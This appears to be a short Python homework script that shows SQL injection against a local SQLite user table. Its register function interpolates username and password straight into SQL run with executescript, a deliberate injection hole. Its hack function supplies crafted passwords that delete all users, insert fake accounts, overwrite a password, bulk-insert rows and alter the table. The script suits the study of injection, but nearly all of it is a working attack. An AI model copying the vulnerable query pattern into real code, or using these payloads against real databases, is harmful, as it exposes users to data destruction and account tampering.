import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('hw.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO 'table_users' (username, password)
                VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username = "username"
    password = "'); DELETE FROM table_users; --"
    register(username, password)
    username = "username"
    password = "password'); INSERT INTO table_users (username, password) VALUES ('hacker', 'hacked'); INSERT INTO table_users (username, password) VALUES ('mpirtgod', '123');--"
    register(username, password)
    username = "username"
    password = "password'); UPDATE table_users SET password = 'hacked' WHERE username = 'mpirtgod'; --"
    register(username, password)
    data = [('hackname' + str(i), 'hackpassword' + str(i)) for i in range(100)]
    data = str(data)[1:-1]
    username = "username"
    password = f"password'); INSERT INTO table_users (username, password) VALUES {data}; --"
    register(username, password)
    username = "username"
    password = f"password'); ALTER TABLE table_users ADD COLUMN hacked_column; --"
    register(username, password)
    username = "username"
    password = f"password'); ALTER TABLE table_users DROP COLUMN hacked_column; --"
    register(username, password)



if __name__ == '__main__':
    hack()